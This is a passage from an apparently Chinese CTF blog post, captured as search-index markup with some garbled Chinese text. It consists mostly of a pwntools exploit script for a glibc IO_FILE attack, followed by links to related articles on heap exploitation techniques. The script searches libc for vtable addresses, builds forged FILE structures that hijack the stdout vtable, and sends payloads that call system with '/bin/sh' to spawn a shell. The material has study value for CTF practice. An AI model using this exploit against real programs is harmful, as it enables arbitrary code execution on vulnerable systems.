class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_IO_wfile_jumps_maybe_mmap</span>():</span><br><span class="line">    <span class="keyword">global</span> libc,libc_base</span><br><span class="line">    a = <span class="built_in">list</span>(libc.search(p64(libc.symbols[<span class="string">&#x27;_IO_wfile_overflow&#x27;</span>])))</span><br><span class="line">    b = <span class="built_in">list</span>(libc.search(p64(libc.symbols[<span class="string">&#x27;_IO_file_close&#x27;</span>])))</span><br><span class="line">    ans = []</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(i - j) == <span class="number">0x70</span> <span class="keyword">and</span> i - <span class="number">24</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">                ans.append(i - <span class="number">24</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(x + libc_base), ans))&#125;</span> may be the address of _IO_wfile_jumps_maybe_mmap&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (u64(libc.read(ans[<span class="number">0</span>] + <span class="number">0x20</span>,<span class="number">0x8</span>)) + libc_base) == (libc.symbols[<span class="string">&#x27;_IO_wfile_underflow&#x27;</span>] + libc_base):</span><br><span class="line">        result = ans[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = ans[<span class="number">0</span>]</span><br><span class="line">    log.success(<span class="string">f&#x27;_IO_wfile_jumps_maybe_mmap:<span class="subst">&#123;result+libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result + libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_IO_file_jumps</span>():</span><br><span class="line">    <span class="keyword">global</span> libc,libc_base</span><br><span class="line">    IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">    IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">    IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">    IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span> + libc_base</span><br><span class="line">    log.success(<span class="string">f&#x27;IO_str_jumps:<span class="subst">&#123;IO_str_jumps:#x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> IO_str_jumps</span><br><span class="line"></span><br><span class="line">IO_str_jumps = search_IO_file_jumps()</span><br><span class="line">_IO_default_xsgetn = IO_str_jumps + <span class="number">0x40</span></span><br><span class="line">_IO_default_xsputn = IO_str_jumps + <span class="number">0x38</span></span><br><span class="line">_IO_wfile_jumps_maybe_mmap=search_IO_wfile_jumps_maybe_mmap()</span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span>, <span class="comment"># disable lock</span></span><br><span class="line">    <span class="number">0x38</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_base + libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x100</span>, <span class="comment"># +0xe0å¯å†™å³å¯</span></span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>), <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xd8</span>: _IO_wfile_jumps_maybe_mmap - <span class="number">0x18</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x408</span>,fake_file+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>],</span><br><span class="line">    <span class="number">0x38</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xd8</span>: _IO_default_xsputn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    <span class="number">0x30</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_write_end</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap </span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(flat(&#123;</span><br><span class="line">    <span class="number">0</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>], <span class="comment"># retn</span></span><br><span class="line">    <span class="number">0x8</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x1c8</span>-<span class="number">0xc8</span>: &#123;</span><br><span class="line">        <span class="comment"># 0x0: p32(0xffffffff),</span></span><br><span class="line">        <span class="number">0x0</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">        <span class="number">0x40</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">        <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line"></span><br><span class="line">        <span class="number">0xd8</span>: _IO_default_xsgetn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">        <span class="number">0x08</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_read_ptr</span></span><br><span class="line">        <span class="number">0x10</span>: libc_base+libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + (<span class="number">0x1c8</span> - <span class="number">0xc8</span>), <span class="comment"># _IO_read_end</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xe0</span>: &#123;</span><br><span class="line">            <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h4><p><a href="https://www.cnblogs.com/Sta8r9/p/17586219.html">https://www.cnblogs.com/Sta8r9/p/17586219.html</a>(house of cat)<br><a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a>(House of catæ–°å‹glibcä¸­IOåˆ©ç”¨æ‰‹æ³•è§£æ &amp;&amp; ç¬¬å…­å±Šå¼ºç½‘æ¯House of catè¯¦è§£)<br><a href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a>(House OF Kiwi)<br><a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>([åŸåˆ›]House of apple ä¸€ç§æ–°çš„glibcä¸­IOæ”»å‡»æ–¹æ³• (2))<br><a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_13">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_13</a>([åŸåˆ›] CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“)<br><a href="https://bbs.kanxue.com/thread-276031.htm(%5B%E5%8E%9F%E5%88%9B%5D%E6%97%A0%E8%B7%AF%E8%BF%9C%E5%BE%81%E2%80%94%E2%80%94GLIBC2.37%E5%90%8E%E6%97%B6%E4%BB%A3%E7%9A%84IO%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93%EF%BC%88%E4%BA%8C%EF%BC%89house_of_%E7%A7%A6%E6%9C%88%E6%B1%89%E5%85%B3)">https://bbs.kanxue.com/thread-276031.htm([åŸåˆ›]æ— è·¯è¿œå¾â€”â€”GLIBC2.37åæ—¶ä»£çš„IOæ”»å‡»ä¹‹é“ï¼ˆäºŒï¼‰house_of_ç§¦æœˆæ±‰å…³)</a><br><a href="https://bbs.kanxue.com/thread-273863.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-273863.htm#msg_header_h3_0</a>([åŸåˆ›]House of apple ä¸€ç§æ–°çš„glibcä¸­IOæ”»å‡»æ–¹æ³• (3))<br><a href="https://bbs.kanxue.com/thread-276056.htm(%5B%E5%8E%9F%E5%88%9B%5D%E6%97%A0%E8%B7%AF%E8%BF%9C%E5%BE%81%E2%80%94%E2%80%94GLIBC2.37%E5%90%8E%E6%97%B6%E4%BB%A3%E7%9A%84IO%E6%94%BB%E5%87%BB%E4%B9%8B%E9%81%93%EF%BC%88%E4%BA%94%EF%BC%89house_of_%E4%B8%80%E9%AA%91%E5%BD%93%E5%8D%83)">https://bbs.kanxue.com/thread-276056.htm([åŸåˆ›]æ— è·¯è¿œå¾â€”â€”GLIBC2.37åæ—¶ä»£çš„IOæ”»å‡»ä¹‹é“ï¼ˆäº”ï¼‰house_of_ä¸€éª‘å½“åƒ)</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
